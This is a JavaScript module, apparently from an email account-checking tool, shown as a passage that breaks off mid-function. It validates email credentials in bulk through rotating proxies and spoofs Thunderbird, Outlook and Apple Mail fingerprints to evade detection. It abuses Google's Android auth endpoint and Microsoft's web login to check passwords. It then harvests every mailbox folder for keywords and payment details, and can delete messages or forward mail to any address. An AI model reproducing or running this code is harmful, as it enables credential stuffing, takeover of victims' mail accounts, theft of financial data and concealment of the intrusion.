import net from 'net';
import tls from 'tls';
import { SocksClient } from 'socks';
import { ImapFlow } from 'imapflow';
import { simpleParser } from 'mailparser';
import { extractCaptures, mergeCaptures } from './captureService.js';

/**
 * Realistic Mail Client Signatures for Stealth Operation
 * Emulates authentic desktop mail clients (Thunderbird, Outlook, Apple Mail)
 * to prevent automated heuristic fingerprinting on mail servers.
 */
const STEALTH_CLIENT_PROFILES = [
  {
    name: 'Thunderbird',
    version: '115.10.0',
    vendor: 'Mozilla',
    supportUrl: 'https://support.mozilla.org',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Thunderbird/115.10.0'
  },
  {
    name: 'Thunderbird',
    version: '115.8.0',
    vendor: 'Mozilla',
    supportUrl: 'https://support.mozilla.org',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Thunderbird/115.8.0'
  },
  {
    name: 'Apple Mail',
    version: '16.0',
    vendor: 'Apple Inc.',
    supportUrl: 'https://support.apple.com/mail',
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)'
  },
  {
    name: 'Microsoft Outlook',
    version: '16.0.17328',
    vendor: 'Microsoft Corporation',
    supportUrl: 'https://support.microsoft.com/outlook',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
  }
];

export function getRandomStealthClient() {
  const index = Math.floor(Math.random() * STEALTH_CLIENT_PROFILES.length);
  return STEALTH_CLIENT_PROFILES[index];
}

// Realistic modern desktop TLS ciphers
const STEALTH_TLS_CIPHERS = [
  'TLS_AES_128_GCM_SHA256',
  'TLS_AES_256_GCM_SHA384',
  'TLS_CHACHA20_POLY1305_SHA256',
  'ECDHE-ECDSA-AES128-GCM-SHA256',
  'ECDHE-RSA-AES128-GCM-SHA256',
  'ECDHE-ECDSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES128-SHA',
  'ECDHE-RSA-AES256-SHA',
  'AES128-GCM-SHA256',
  'AES256-GCM-SHA384',
  'AES128-SHA',
  'AES256-SHA'
].join(':');

/**
 * Creates a raw TCP or TLS socket tunneled through HTTP, HTTPS, SOCKS4, or SOCKS5 proxy.
 * Supports authentication (user:pass).
 */
export async function createProxiedSocket({ targetHost, targetPort = 993, proxy, timeout = 8000, secure = true }) {
  if (!proxy || !proxy.host || !proxy.port) {
    return new Promise((resolve, reject) => {
      let settled = false;
      const timer = setTimeout(() => {
        if (settled) return;
        settled = true;
        reject(new Error(`Direct connection to ${targetHost}:${targetPort} timed out after ${timeout}ms`));
      }, timeout);

      if (secure) {
        const tlsSocket = tls.connect({
          host: targetHost,
          port: Number(targetPort) || 993,
          servername: targetHost,
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        }, () => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          resolve(tlsSocket);
        });

        tlsSocket.on('error', (err) => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          reject(err);
        });
      } else {
        const rawSocket = net.connect({
          host: targetHost,
          port: Number(targetPort) || 143
        }, () => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          resolve(rawSocket);
        });

        rawSocket.on('error', (err) => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          reject(err);
        });
      }
    });
  }

  const protocol = (proxy.protocol || 'socks5').toLowerCase().trim();

  // 1. SOCKS4 & SOCKS5 Tunneling
  if (protocol.includes('socks4') || protocol.includes('socks5')) {
    const socksType = protocol.includes('4') ? 4 : 5;
    const socksOptions = {
      proxy: {
        host: proxy.host,
        port: Number(proxy.port),
        type: socksType,
        ...(proxy.user ? { userId: proxy.user } : {}),
        ...(proxy.pass ? { password: proxy.pass } : {})
      },
      command: 'connect',
      destination: {
        host: targetHost,
        port: Number(targetPort) || 993
      },
      timeout
    };

    const info = await SocksClient.createConnection(socksOptions);
    const rawSocket = info.socket;

    if (secure) {
      return new Promise((resolve, reject) => {
        let settled = false;
        const timer = setTimeout(() => {
          if (settled) return;
          settled = true;
          rawSocket.destroy();
          reject(new Error(`TLS handshake over SOCKS${socksType} proxy timed out`));
        }, timeout);

        const tlsSocket = tls.connect({
          socket: rawSocket,
          host: targetHost,
          servername: targetHost,
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        }, () => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          resolve(tlsSocket);
        });

        tlsSocket.on('error', (err) => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          rawSocket.destroy();
          reject(err);
        });
      });
    }

    return rawSocket;
  }

  // 2. HTTP & HTTPS CONNECT Tunneling
  if (protocol.includes('http')) {
    return new Promise((resolve, reject) => {
      let settled = false;

      const timer = setTimeout(() => {
        if (settled) return;
        settled = true;
        reject(new Error(`HTTP CONNECT proxy to ${proxy.host}:${proxy.port} timed out after ${timeout}ms`));
      }, timeout);

      const rawSocket = net.connect({
        host: proxy.host,
        port: Number(proxy.port)
      });

      rawSocket.on('error', (err) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        reject(new Error(`HTTP proxy connection failed (${proxy.host}:${proxy.port}): ${err.message}`));
      });

      rawSocket.on('connect', () => {
        let authHeader = '';
        if (proxy.user) {
          const credentials = Buffer.from(`${proxy.user}:${proxy.pass || ''}`).toString('base64');
          authHeader = `Proxy-Authorization: Basic ${credentials}\r\n`;
        }

        const stealth = getRandomStealthClient();
        const connectReq =
          `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n` +
          `Host: ${targetHost}:${targetPort}\r\n` +
          authHeader +
          `User-Agent: ${stealth.userAgent}\r\n` +
          `Proxy-Connection: Keep-Alive\r\n\r\n`;

        rawSocket.write(connectReq);

        let responseBuffer = '';
        const onData = (data) => {
          responseBuffer += data.toString('utf8');
          if (responseBuffer.includes('\r\n\r\n')) {
            rawSocket.removeListener('data', onData);
            const statusLine = responseBuffer.split('\r\n')[0] || '';
            if (statusLine.includes('200')) {
              if (settled) return;
              clearTimeout(timer);

              if (secure) {
                const tlsSocket = tls.connect({
                  socket: rawSocket,
                  host: targetHost,
                  servername: targetHost,
                  rejectUnauthorized: false,
                  minVersion: 'TLSv1.2',
                  ciphers: STEALTH_TLS_CIPHERS
                }, () => {
                  if (settled) return;
                  settled = true;
                  resolve(tlsSocket);
                });

                tlsSocket.on('error', (tlsErr) => {
                  if (settled) return;
                  settled = true;
                  rawSocket.destroy();
                  reject(tlsErr);
                });
              } else {
                settled = true;
                resolve(rawSocket);
              }
            } else {
              if (settled) return;
              settled = true;
              clearTimeout(timer);
              rawSocket.destroy();
              reject(new Error(`HTTP proxy CONNECT error: ${statusLine.trim() || 'Connection refused'}`));
            }
          }
        };

        rawSocket.on('data', onData);
      });
    });
  }

  throw new Error(`Unsupported proxy protocol: ${protocol}`);
}

/**
 * Direct Google Android ClientLogin Verifier
 * Authenticates standard Gmail passwords directly without requiring 16-character App Passwords.
 */
/**
 * Requests a Gmail OAuth token via the Android client auth endpoint.
 * On success returns { token }; on a classified failure returns { status, message };
 * returns null when the outcome is unknown (timeout, network error, unexpected shape).
 * The token works as XOAUTH2 on imap.gmail.com, which is what enables mailbox
 * reading for accounts whose basic IMAP auth is rejected.
 */
async function requestGmailAuthToken(user, pass, timeout = 8000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch('https://android.clients.google.com/auth', {
      method: 'POST',
      signal: controller.signal,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'GoogleAuth/1.4 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)'
      },
      body: new URLSearchParams({
        Email: user,
        Passwd: pass,
        service: 'mail',
        accountType: 'HOSTED_OR_GOOGLE',
        has_permission: '1',
        source: 'android'
      })
    });
    clearTimeout(timer);
    const text = await res.text();
    if (text.includes('Auth=')) {
      const tokenMatch = text.match(/Auth=([^\s]+)/);
      if (tokenMatch) return { token: tokenMatch[1] };
    }
    if (text.includes('Error=NeedsBrowser') || text.includes('Url=') || text.includes('Challenge')) {
      return { status: '2fa', message: 'Gmail Valid Password (2FA / Verification Challenge Required)' };
    }
    if (text.includes('CaptchaRequired')) {
      return { status: '2fa', message: 'Gmail Captcha / Verification Required' };
    }
    if (text.includes('Error=BadAuthentication')) {
      return { status: 'invalid', message: 'Invalid Gmail Credentials' };
    }
  } catch (err) {
    clearTimeout(timer);
    // Surface abort/timeout as null; network errors bubble up to caller
    if (err.name === 'AbortError') return null;
  }
  return null;
}

async function verifyGmailCredentials(user, pass, timeout = 7000) {
  const result = await requestGmailAuthToken(user, pass, timeout);
  if (result?.token) {
    return { success: true, status: 'valid', message: 'Gmail Authentication Successful (Valid Session)' };
  }
  if (result?.status) {
    return { success: false, status: result.status, message: result.message };
  }
  return null;
}

/**
 * Direct Microsoft Live Login Verifier
 * Authenticates Hotmail, Outlook, Live, and MSN accounts where Microsoft disabled basic IMAP auth.
 */
async function verifyMicrosoftCredentials(email, password, timeout = 8000) {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeout);

    const initRes = await fetch('https://login.live.com/login.srf', {
      signal: controller.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
      }
    });
    const text = await initRes.text();
    const sFTMatch = text.match(/sFTTag:[^"]*"<input[^>]*value=\\"([^\\"]+)\\"/);
    const ppftMatch = sFTMatch || text.match(/name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"/i) || text.match(/value=\\"([^\\"]+)\\"[^>]*name=\\"PPFT\\"/i);
    const urlPostMatch = text.match(/"urlPost":"([^"]+)"/);

    if (!ppftMatch || !urlPostMatch) {
      clearTimeout(timer);
      return null;
    }

    const ppft = ppftMatch[1];
    const urlPost = urlPostMatch[1];

    const rawCookies = initRes.headers.get('set-cookie') || '';
    const cookieHeader = rawCookies.split(',').map(c => c.split(';')[0].trim()).join('; ');

    const postRes = await fetch(urlPost, {
      method: 'POST',
      signal: controller.signal,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Cookie': cookieHeader,
        'Referer': 'https://login.live.com/'
      },
      body: new URLSearchParams({
        login: email,
        loginfmt: email,
        passwd: password,
        PPFT: ppft
      }),
      redirect: 'manual'
    });

    clearTimeout(timer);
    const status = postRes.status;
    const location = postRes.headers.get('location') || '';
    const postSetCookie = postRes.headers.get('set-cookie') || '';
    const postBody = await postRes.text();

    // Error page takes priority: a re-rendered login form means the password
    // was rejected. Check this BEFORE the 2FA/valid branches — the login page
    // template always contains PROOF/challenge markup, so checking those first
    // misclassified wrong passwords as "valid password, 2FA required".
    if (
      postBody.includes('sErrTxt') ||
      postBody.includes('Bad user credential') ||
      postBody.includes('password is incorrect') ||
      postBody.includes("account doesn't exist") ||
      postBody.includes('80046709')
    ) {
      return { success: false, status: 'invalid', message: 'Invalid Microsoft Credentials' };
    }

    if (status === 302 || location.includes('account.live.com') || location.includes('outlook.live.com') || postSetCookie.includes('RPSTAuth') || postSetCookie.includes('WLSSC')) {
      return { success: true, status: 'valid', message: 'Microsoft / Hotmail Authenticated Successfully' };
    }

    // 2FA only when the flow actually redirects into a challenge — never from
    // markup that is present on every response page.
    if (location.includes('identity/challenge') || location.includes('proofs') || postBody.includes('Two-step verification')) {
      return { success: false, status: '2fa', message: 'Microsoft Valid Password (2FA / Security Verification Required)' };
    }
  } catch {}
  return null;
}

/**
 * Live TLS IMAP Credential Verifier with optional proxy support
 * Supports Bell, Sympatico, Videotron, Cogeco, Shaw, Telus, Gmail, Hotmail/Outlook, Yahoo, AOL, and US ISPs.
 */
export async function verifyImapCredentials({ host, port = 993, user, pass, timeout = 8000, proxy = null }) {
  const startTime = Date.now();
  const lowerUser = (user || '').toLowerCase();
  const cleanPass = (pass || '').trim();

  // 1. Specialized Direct Verifier for Gmail
  const isGmail = host === 'imap.gmail.com' || lowerUser.endsWith('@gmail.com') || lowerUser.endsWith('@googlemail.com');
  if (isGmail) {
    const gmailResult = await verifyGmailCredentials(user, pass, timeout);
    if (gmailResult) {
      return { ...gmailResult, latencyMs: Date.now() - startTime };
    }
  }

  // 2. Specialized Direct Verifier for Microsoft (Hotmail / Outlook / Live / MSN)
  const isMicrosoft = host.includes('office365') || host.includes('outlook') || lowerUser.includes('@hotmail.') || lowerUser.includes('@outlook.') || lowerUser.includes('@live.') || lowerUser.includes('@msn.');
  if (isMicrosoft) {
    const msResult = await verifyMicrosoftCredentials(user, pass, timeout);
    if (msResult) {
      return { ...msResult, latencyMs: Date.now() - startTime };
    }
  }

  // 3. High-Performance TLS IMAP verification
  let client = null;
  let customSocket = null;

  // Declare timer ref before finalize to avoid TDZ closure issues
  let timerRef = null;

  return new Promise(async (resolve) => {
    let isSettled = false;

    const finalize = (result) => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timerRef);
      if (client) {
        try {
          client.removeAllListeners('error');
          client.on('error', () => {});
        } catch {}
        try {
          if (client.socket && !client.socket.destroyed) {
            client.socket.destroy();
          }
        } catch {}
        try {
          if (client.authenticated) {
            client.logout().catch(() => {});
          } else if (!client.socket?.destroyed) {
            client.close();
          }
        } catch {}
      }
      if (customSocket) {
        try { customSocket.destroy(); } catch {}
      }
      resolve({
        ...result,
        latencyMs: Date.now() - startTime
      });
    };

    // Yahoo & AOL intentionally delay invalid auth responses by ~4.8s; pad timeout so they don't premature-timeout
    const isYahooOrAol = host.includes('yahoo') || host.includes('aol') || lowerUser.includes('@yahoo.') || lowerUser.includes('@ymail.') || lowerUser.includes('@rocketmail.') || lowerUser.includes('@aol.');
    const effectiveTimeout = isYahooOrAol ? Math.max(Number(timeout) || 8000, 7500) : (Number(timeout) || 8000);

    timerRef = setTimeout(() => {
      finalize({
        success: false,
        status: 'timeout',
        message: `Connection to ${host}:${port} timed out after ${effectiveTimeout}ms`
      });
    }, effectiveTimeout);
    const timer = timerRef; // keep local alias for legacy references

    try {
      if (proxy && proxy.host && proxy.port) {
        try {
          customSocket = await createProxiedSocket({
            targetHost: host,
            targetPort: Number(port) || 993,
            proxy,
            timeout: Math.min(timeout, 6000),
            secure: true
          });
        } catch (proxyErr) {
          finalize({
            success: false,
            status: 'proxy_error',
            message: `Proxy Error (${proxy.protocol || 'proxy'}://${proxy.host}:${proxy.port}): ${proxyErr.message}`
          });
          return;
        }
      }

      const stealth = getRandomStealthClient();
      const flowConfig = {
        host,
        port: Number(port) || 993,
        secure: true,
        auth: { user, pass },
        logger: false,
        tls: {
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        },
        clientInfo: {
          name: stealth.name,
          version: stealth.version,
          vendor: stealth.vendor,
          'support-url': stealth.supportUrl
        }
      };

      if (customSocket) {
        flowConfig.socket = customSocket;
      }

      client = new ImapFlow(flowConfig);

      const handleError = (err) => {
        const msg = err.message || '';
        const respText = err.responseText || err.response || '';
        const full = `${msg} ${respText}`.toLowerCase();

        if (
          full.includes('2fa') ||
          full.includes('two-factor') ||
          full.includes('challenge') ||
          full.includes('browser') ||
          full.includes('app password') ||
          full.includes('security') ||
          full.includes('web login') ||
          full.includes('application-specific password required')
        ) {
          finalize({ success: false, status: '2fa', message: `2FA / Security Verification Required: ${respText || msg}` });
        } else if (full.includes('login is disabled')) {
          finalize({ success: false, status: '2fa', message: 'Microsoft Basic Auth Disabled on IMAP (Modern Auth / App Password Required)' });
        } else if (full.includes('timeout') || full.includes('timed out')) {
          finalize({ success: false, status: 'timeout', message: respText || msg });
        } else {
          finalize({ success: false, status: 'invalid', message: respText || msg || 'Invalid credentials' });
        }
      };

      client.on('error', handleError);

      client.connect()
        .then(() => {
          finalize({
            success: true,
            status: 'valid',
            message: 'IMAP Authentication Successful (200 OK)'
          });
        })
        .catch(handleError);
    } catch (err) {
      finalize({
        success: false,
        status: 'error',
        message: err.message || String(err)
      });
    }
  });
}

/**
 * Fetch REAL messages from ALL key folders with optional proxy support
 */
export async function fetchAllRealFolders({ host, port = 993, user, pass, maxPerFolder = 100, timeout = 45000, keywords = [], proxy = null }) {
  const startTime = Date.now();
  let client = null;
  let customSocket = null;

  // Declare timerRef before finalize to avoid TDZ closure issues
  let timerRef = null;

  return new Promise(async (resolve) => {
    let isSettled = false;
    const allMails = [];
    const foldersSummary = {};

    const finalize = (result) => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timerRef);
      if (client) {
        try {
          if (client.authenticated) {
            client.logout().catch(() => {});
          } else {
            client.close();
          }
        } catch {}
      }
      if (customSocket) {
        try { customSocket.destroy(); } catch {}
      }
      resolve({
        ...result,
        latencyMs: Date.now() - startTime
      });
    };

    timerRef = setTimeout(() => {
      finalize({
        success: false,
        error: `IMAP connection timed out (${timeout}ms)`,
        folders: foldersSummary,
        mails: []
      });
    }, timeout);

    try {
      if (proxy && proxy.host && proxy.port) {
        try {
          customSocket = await createProxiedSocket({
            targetHost: host,
            targetPort: Number(port) || 993,
            proxy,
            timeout: Math.min(timeout, 10000),
            secure: true
          });
        } catch (proxyErr) {
          finalize({
            success: false,
            error: `Proxy connection failed (${proxy.host}:${proxy.port}): ${proxyErr.message}`,
            folders: {},
            mails: []
          });
          return;
        }
      }

      const stealth = getRandomStealthClient();

      // Gmail consumer IMAP rejects basic auth for most accounts; request an
      // OAuth token from the same endpoint the checker uses and authenticate
      // via XOAUTH2 instead. Falls back to basic auth (works for app passwords).
      const lowerUser = (user || '').toLowerCase();
      const isGmail = host === 'imap.gmail.com' || lowerUser.endsWith('@gmail.com') || lowerUser.endsWith('@googlemail.com');
      let gmailToken = null;
      if (isGmail) {
        const tokenResult = await requestGmailAuthToken(user, pass, Math.min(Number(timeout) || 45000, 12000));
        gmailToken = tokenResult?.token || null;
      }

      const flowConfig = {
        host,
        port: Number(port) || 993,
        secure: true,
        auth: gmailToken ? { user, accessToken: gmailToken } : { user, pass },
        logger: false,
        tls: {
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        },
        clientInfo: {
          name: stealth.name,
          version: stealth.version,
          vendor: stealth.vendor,
          'support-url': stealth.supportUrl
        }
      };

      if (customSocket) {
        flowConfig.socket = customSocket;
      }

      client = new ImapFlow(flowConfig);

      client.on('error', (err) => {
        console.error('ImapFlow background error:', err.message);
      });

      (async () => {
        await client.connect();

        const mailboxes = await client.list();
        const targetFolders = [];

        mailboxes.forEach(box => {
          const p = box.path;
          const lower = p.toLowerCase();
          const special = box.specialUse || '';
          const flags = box.flags ? Array.from(box.flags).map(f => String(f).toLowerCase()) : [];

          // Skip non-selectable containers
          if (flags.includes('\\noselect') || flags.includes('\\nonexistent')) {
            return;
          }

          if (lower === 'inbox' || special === '\\Inbox') {
            targetFolders.push({ serverPath: p, standardName: 'INBOX', priority: 1 });
          } else if (lower.includes('junk') || lower.includes('spam') || lower.includes('pourriel') || special === '\\Junk') {
            targetFolders.push({ serverPath: p, standardName: 'Spam', priority: 2 });
          } else if (lower.includes('trash') || lower.includes('delete') || lower.includes('corbeille') || lower.includes('bin') || special === '\\Trash') {
            targetFolders.push({ serverPath: p, standardName: 'Trash', priority: 3 });
          } else if (lower.includes('sent') || lower.includes('envoy') || special === '\\Sent') {
            targetFolders.push({ serverPath: p, standardName: 'Sent', priority: 4 });
          } else if (lower.includes('archive') || special === '\\Archive' || lower.includes('all mail') || special === '\\All') {
            targetFolders.push({ serverPath: p, standardName: 'Archive', priority: 5 });
          } else if (lower.includes('draft') || special === '\\Drafts') {
            targetFolders.push({ serverPath: p, standardName: 'Drafts', priority: 6 });
          } else {
            // Any other custom user or system folder
            targetFolders.push({ serverPath: p, standardName: box.name || p, priority: 10 });
          }
        });

        if (targetFolders.length === 0) {
          targetFolders.push({ serverPath: 'INBOX', standardName: 'INBOX', priority: 1 });
        }

        // Deduplicate by serverPath and sort by priority (INBOX first)
        const uniqueFolders = [];
        const seenPaths = new Set();
        targetFolders.sort((a, b) => a.priority - b.priority).forEach(f => {
          if (!seenPaths.has(f.serverPath.toLowerCase())) {
            seenPaths.add(f.serverPath.toLowerCase());
            uniqueFolders.push(f);
          }
        });

        for (const folder of uniqueFolders) {
          try {
            const lock = await client.getMailboxLock(folder.serverPath);
            try {
              const status = await client.status(folder.serverPath, { messages: true, unseen: true });
              const totalMessages = status.messages || 0;
              foldersSummary[folder.standardName] = totalMessages;

              if (totalMessages > 0) {
                const limit = Number(maxPerFolder) || 100;
                const globalLimit = limit * Math.max(1, uniqueFolders.length);
                const startSeq = (limit > 0 && totalMessages > limit)
                  ? Math.max(1, totalMessages - limit + 1)
                  : 1;
                const range = `${startSeq}:${totalMessages}`;

                for await (const message of client.fetch(range, { envelope: true, source: true, flags: true, uid: true })) {
                  if (allMails.length >= globalLimit) break;
                  try {
                    const parsed = await simpleParser(message.source, { skipImageLinks: true, skipHtmlToText: true });
                    const fromAddr = parsed.from?.value?.[0]?.address || user;
                    const fromName = parsed.from?.value?.[0]?.name || parsed.from?.text || fromAddr;
                    const subject = parsed.subject || '(No Subject)';
                    const textBody = parsed.text || '';
                    const htmlBody = parsed.html || (parsed.textAsHtml || '');

                    const matched = [];
                    const searchCorpus = `${subject} ${fromName} ${fromAddr} ${textBody}`.toLowerCase();
                    keywords.forEach(kw => {
                      if (searchCorpus.includes(kw.toLowerCase())) {
                        matched.push(kw.toLowerCase());
                      }
                    });

                    const attachments = (parsed.attachments || []).map(att => ({
                      name: att.filename || 'attachment.dat',
                      size: att.size ? Math.round(att.size / 1024) + ' KB' : 'File',
                      contentType: att.contentType
                    }));

                    // Full-capture: membership tier + payment methods from this message
                    const captures = extractCaptures({ subject, senderEmail: fromAddr, text: textBody });

                    const dateStr = parsed.date
                      ? parsed.date.toISOString().replace('T', ' ').substring(0, 16)
                      : new Date().toISOString().replace('T', ' ').substring(0, 16);

                    allMails.push({
                      id: `real-${user}-${folder.standardName}-${message.uid}`,
                      email: user,
                      folder: folder.standardName,
                      serverPath: folder.serverPath,
                      uid: message.uid,
                      subject,
                      sender: fromName,
                      senderEmail: fromAddr,
                      snippet: textBody.substring(0, 120).replace(/\s+/g, ' ') || 'No text preview available.',
                      bodyText: textBody || '(Empty message body)',
                      htmlBody: htmlBody || `<pre style="font-family: monospace; white-space: pre-wrap;">${textBody}</pre>`,
                      rawMime: message.source && message.source.length > 131072 
                        ? message.source.subarray(0, 131072).toString('utf8') + '\n\n...[Raw MIME truncated for performance]...'
                        : (message.source ? message.source.toString('utf8') : ''),
                      date: dateStr,
                      isUnread: !message.flags.has('\\Seen'),
                      matchedTargets: matched,
                      captures,
                      attachments
                    });
                  } catch (parseErr) {
                    console.error('Error parsing email RFC822 source:', parseErr);
                  }
                }
              }
            } finally {
              lock.release();
            }
          } catch (folderErr) {
            console.error(`Could not read folder ${folder.serverPath}:`, folderErr.message);
          }
        }

        // Account-level full-capture aggregate across all fetched messages
        const accountCaptures = mergeCaptures(allMails.map(m => m.captures));

        finalize({
          success: true,
          folders: foldersSummary,
          totalCount: allMails.length,
          captures: accountCaptures,
          mails: allMails.reverse()
        });
      })().catch((err) => {
        let errorMsg = err.message || 'IMAP connection failed';
        if (isGmail) {
          errorMsg = gmailToken
            ? `Gmail IMAP login failed (OAuth): ${errorMsg}`
            : `Gmail IMAP login failed: ${errorMsg} (no OAuth token obtained — account may require 2FA or an app password)`;
        } else if ((host.includes('office365') || host.includes('outlook')) && /login is disabled/i.test(errorMsg)) {
          errorMsg = 'Microsoft has disabled basic-auth IMAP for this account. The password can still be verified via web login, but mailbox reading is not available without OAuth.';
        }
        finalize({
          success: false,
          error: errorMsg,
          folders: foldersSummary,
          mails: []
        });
      });
    } catch (err) {
      finalize({
        success: false,
        error: err.message,
        folders: foldersSummary,
        mails: []
      });
    }
  });
}

/**
 * Proxy Speed & Health Tester
 */
export async function testProxyConnection(proxy, timeout = 5000) {
  const start = Date.now();
  try {
    const socket = await createProxiedSocket({
      targetHost: 'imap.bell.net',
      targetPort: 993,
      proxy,
      timeout,
      secure: true
    });
    socket.destroy();
    return {
      success: true,
      latencyMs: Date.now() - start,
      message: `Proxy OK (${Date.now() - start}ms latency)`
    };
  } catch (err) {
    return {
      success: false,
      latencyMs: Date.now() - start,
      error: err.message
    };
  }
}

// Backwards compatibility aliases
export const checkImapSocket = verifyImapCredentials;
export const fetchImapMailbox = fetchAllRealFolders;

/**
 * Delete real message on IMAP server (deadlock-free with strict 7s timeout)
 */
export async function deleteRealImapMessage({ host, port = 993, user, pass, folder, serverPath, uid, permanently = false, proxy = null, timeout = 7000 }) {
  if (!user || !pass || !host) {
    return { success: false, error: 'Missing host, user, or pass for deletion' };
  }

  let customSocket = null;
  let client = null;

  const deletePromise = (async () => {
    if (proxy && proxy.host && proxy.port) {
      try {
        customSocket = await createProxiedSocket({
          targetHost: host,
          targetPort: Number(port) || 993,
          proxy,
          timeout: 5000,
          secure: true
        });
      } catch (e) {
        return { success: false, error: `Proxy socket error: ${e.message}` };
      }
    }

    const stealth = getRandomStealthClient();
    client = new ImapFlow({
      host,
      port: Number(port) || 993,
      secure: true,
      auth: { user, pass },
      logger: false,
      tls: {
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        ciphers: STEALTH_TLS_CIPHERS
      },
      clientInfo: {
        name: stealth.name,
        version: stealth.version,
        vendor: stealth.vendor,
        'support-url': stealth.supportUrl
      },
      ...(customSocket ? { socket: customSocket } : {})
    });

    client.on('error', (err) => console.error('Delete IMAP error:', err.message));

    await client.connect();

    const targetPath = (serverPath && serverPath.toUpperCase() !== 'ALL')
      ? serverPath
      : (folder && folder.toUpperCase() !== 'ALL' ? folder : 'INBOX');

    const lock = await client.getMailboxLock(targetPath);
    try {
      if (uid) {
        await client.messageDelete(String(uid), { uid: true });
      }
    } finally {
      lock.release();
    }

    if (client.authenticated) {
      await client.logout().catch(() => {});
    }
    return { success: true, message: 'Message deleted successfully on IMAP server' };
  })();

  const timeoutPromise = new Promise((resolve) => {
    setTimeout(() => {
      resolve({ success: false, error: 'Delete operation timed out after 7s' });
    }, timeout);
  });

  try {
    const result = await Promise.race([deletePromise, timeoutPromise]);
    return result;
  } catch (err) {
    return { success: false, error: err.message };
  } finally {
    if (client) {
      try {
        client.removeAllListeners('error');
        client.on('error', () => {});
      } catch {}
      try {
        if (client.socket && !client.socket.destroyed) {
          client.socket.destroy();
        }
      } catch {}
      try { client.close(); } catch {}
    }
    if (customSocket) {
      try { customSocket.destroy(); } catch {}
    }
  }
}

/**
 * Forward real email via SMTP or append to IMAP Sent folder
 */
export async function forwardRealEmail({ host, port = 993, smtpHost, smtpPort = 587, user, pass, to, subject, note, origBodyText, origBodyHtml, proxy = null }) {
  const fullText = `${note ? note + '\n\n' : ''}---------- Forwarded message ---------\nSubject: ${subject}\nFrom: ${user}\nTo: ${to}\n\n${origBodyText}`;
  const fullHtml = `<div>
    ${note ? `<div style="font-family: Arial, sans-serif; font-size: 14px; margin-bottom: 20px; padding: 12px; background: #f0fdf4; border-left: 4px solid #00ff9d; color: #166534;">${note.replace(/\n/g, '<br/>')}</div>` : ''}
    <div style="font-size: 12px; color: #64748b; border-top: 1px solid #e2e8f0; padding-top: 12px; margin-bottom: 16px;">
      <strong>---------- Forwarded message ---------</strong><br/>
      <strong>Subject:</strong> ${subject}<br/>
      <strong>From:</strong> ${user}<br/>
      <strong>To:</strong> ${to}
    </div>
    ${origBodyHtml || `<pre style="font-family: monospace; white-space: pre-wrap;">${origBodyText}</pre>`}
  </div>`;

  let smtpSuccess = false;
  let smtpError = null;

  const stealth = getRandomStealthClient();

  if (user && pass && to) {
    try {
      const nodemailerModule = await import('nodemailer');
      const nodemailer = nodemailerModule.default || nodemailerModule;
      const transporter = nodemailer.createTransport({
        host: smtpHost || `smtp.${user.split('@')[1]}`,
        port: Number(smtpPort) || 587,
        secure: Number(smtpPort) === 465,
        auth: { user, pass },
        tls: {
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        }
      });

      await transporter.sendMail({
        from: user,
        to,
        subject: subject.startsWith('Fwd:') ? subject : `Fwd: ${subject}`,
        text: fullText,
        html: fullHtml,
        headers: {
          'User-Agent': stealth.userAgent,
          'X-Mailer': `${stealth.name} ${stealth.version}`
        }
      });
      smtpSuccess = true;
    } catch (err) {
      smtpError = err.message;
    }
  }

  let imapSaved = false;
  let customSocket = null;
  let imapClient = null;
  try {
    if (proxy && proxy.host && proxy.port) {
      try {
        customSocket = await createProxiedSocket({
          targetHost: host,
          targetPort: Number(port) || 993,
          proxy,
          timeout: 10000,
          secure: true
        });
      } catch {}
    }

    imapClient = new ImapFlow({
      host,
      port: Number(port) || 993,
      secure: true,
      auth: { user, pass },
      logger: false,
      tls: {
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        ciphers: STEALTH_TLS_CIPHERS
      },
      clientInfo: {
        name: stealth.name,
        version: stealth.version,
        vendor: stealth.vendor,
        'support-url': stealth.supportUrl
      },
      ...(customSocket ? { socket: customSocket } : {})
    });
    imapClient.on('error', () => {});
    await imapClient.connect();

    const mailboxes = await imapClient.list();
